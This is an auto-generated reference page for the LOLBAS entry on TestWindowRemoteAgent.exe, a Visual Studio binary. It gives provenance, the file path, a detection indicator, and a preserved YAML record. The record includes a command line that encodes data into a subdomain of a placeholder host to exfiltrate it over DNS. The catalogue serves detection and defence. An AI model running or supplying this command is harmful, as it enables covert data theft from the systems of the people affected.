---
parsed_by: focuslocust
source: lolbas
type: generated
---
# TestWindowRemoteAgent.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `testwindowremoteagent.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Testwindowremoteagent.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [TestWindowRemoteAgent.exe](../../tools/windows/testwindowremoteagent.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | testwindowremoteagent.exe |
| name | TestWindowRemoteAgent.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Person: Onat Uzunyayla
Author: Onat Uzunyayla
Commands:
- Category: Upload
  Command: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
  Description: Sends DNS query for open connection to any host, enabling exfiltration over DNS
  MitreID: T1048
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Attackers may utilize this to exfiltrate data over DNS
Created: 2023-08-21
Description: TestWindowRemoteAgent.exe is the command-line tool to establish RPC
Detection:
- IOC: TestWindowRemoteAgent.exe spawning unexpectedly
Full_Path:
- Path: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe
Name: TestWindowRemoteAgent.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Testwindowremoteagent.yml
```

## Detection / Analysis Notes

```text
IOC: TestWindowRemoteAgent.exe spawning unexpectedly
```

```text
- IOC: TestWindowRemoteAgent.exe spawning unexpectedly
```
